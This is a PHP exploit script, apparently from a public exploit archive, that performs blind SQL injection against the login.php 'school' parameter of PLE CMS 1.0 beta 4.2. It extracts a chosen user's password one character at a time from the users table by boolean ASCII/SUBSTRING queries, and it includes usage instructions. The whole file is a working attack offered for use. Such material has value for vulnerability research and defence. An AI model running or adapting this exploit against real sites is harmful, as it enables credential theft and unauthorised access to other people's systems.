<?php

function query ($user, $pos, $chr)
{
	$query = "123 OR ASCII(SUBSTRING((SELECT password FROM users WHERE userID = '{$user}'),{$pos},1))={$chr}";
	$query = str_replace (" ", "%20", $query);
	$query = str_replace ("'", "%27", $query);
	return $query;
}

function exploit ($hostname, $path, $user, $pos, $chr)
{
	$chr = ord ($chr);
	$fp = fsockopen ($hostname, 80);

	$get =  "GET {$path}/login.php?school=" . query ($user, $pos, $chr) . " HTTP/1.1\r\n".
		"Host: {$hostname}\r\n".
		"Connection: Close\r\n\r\n";
	
	fputs ($fp, $get);

	while (!feof ($fp))
		$x .= fgets ($fp, 1024);


	fclose ($fp);
	
	if (preg_match ("/ERROR: School not found!/", $x))
		return false;
	else
		return true;
}

function usage ()
{
	exit (
		"\nPLE CMS 1.0 beta 4.2 Blind SQL Injection Exploit".
		"\n[+] Author: darkjoker".
		"\n[+] Site  : http://darkjoker.net23.net".
		"\n[+] Download: http://kent.dl.sourceforge.net/sourceforge/plecms/plecms_beta4_2.zip".
		"\n[+] Usage   : php xpl.php <hostname> <path> <username> <key>".
		"\n[+] Ex.     : php xpl.php localhost /PLECMS root abcdefghijklmnopqrstuvwxyz0123456789".
		"\n\n");
}

if ($argc < 4)
	usage ();

$hostname = $argv [1];
$path = $argv [2];
$user = $argv [3];
$key = (empty ($argv [4])) ? "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789" : $argv [4];
$chr = 0;
$pos = 1;

print "\n[+] Password: ";

while ($chr < strlen ($key))
{
	if (exploit ($hostname, $path, $user, $pos, $key [$chr]))
	{
		echo $key [$chr];
		$chr = 0;
		$pos++;
	}
	else
		$chr++;
}

print "\n\n";
